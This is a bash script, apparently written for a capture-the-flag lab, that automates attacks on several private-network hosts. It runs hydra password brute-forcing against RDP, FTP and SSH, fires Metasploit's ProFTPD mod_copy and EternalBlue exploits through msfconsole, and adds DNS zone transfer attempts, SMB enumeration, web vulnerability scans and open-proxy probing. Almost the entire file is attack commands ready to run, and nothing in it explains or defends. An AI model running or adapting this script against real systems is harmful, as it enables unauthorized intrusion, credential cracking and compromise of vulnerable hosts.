#!/bin/bash
# Automated CTF Recon and Exploitation Script
echo '[*] Starting automated scans and exploits...'


echo '[*] Processing Host: 192.168.34.1'
echo '[+] RDP service detection using nmap'
nmap -sV -p3389 192.168.34.1
echo '[+] RDP bruteforce using hydra'
hydra -t 4 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://192.168.34.1

echo '[*] Processing Host: 192.168.34.161'
echo '[+] Full scan + service detection using nmap'
nmap -sC -sV -p- 192.168.34.161
echo '[+] FTP brute-force using hydra'
hydra -l anonymous -P /usr/share/wordlists/rockyou.txt ftp://192.168.34.161
echo '[+] ProFTPD mod_copy using msfconsole'
echo -e 'use exploit/unix/ftp/proftpd_modcopy_exec
set RHOST 192.168.34.161
run' | msfconsole -q
echo '[+] DNS zone transfer test using dig'
dig axfr @192.168.34.161
echo '[+] Web directory scan using gobuster'
gobuster dir -u http://192.168.34.161 -w /usr/share/wordlists/dirb/common.txt
echo '[+] Web vuln scan using nikto'
nikto -h http://192.168.34.161

echo '[*] Processing Host: 192.168.34.241'
echo '[+] Proxy detection using nmap'
nmap -p3128 --script http-open-proxy 192.168.34.241
echo '[+] SSRF proxy test using curl'
curl -x 192.168.34.241:3128 http://192.168.34.161

echo '[*] Processing Host: 192.168.34.251'
echo '[+] Directory scan using gobuster'
gobuster dir -u http://192.168.34.251 -w /usr/share/wordlists/dirb/common.txt
echo '[+] Vulnerability scan using nikto'
nikto -h http://192.168.34.251
echo '[+] SSH brute-force using hydra'
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.34.251

echo '[*] Processing Host: 192.168.34.52'
echo '[+] SMB vuln scan using nmap'
nmap -p135,139,445 --script smb-vuln* 192.168.34.52
echo '[+] SMB enumeration using enum4linux'
enum4linux -a 192.168.34.52
echo '[+] Access anonymous shares using smbclient'
smbclient -L \\192.168.34.52\
echo '[+] EternalBlue exploit using msfconsole'
echo -e 'use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.34.52
run' | msfconsole -q
echo '[+] RTSP test using ffmpeg'
ffmpeg -i rtsp://192.168.34.52/live -vframes 1 output.jpg

echo '[*] Automation completed.'
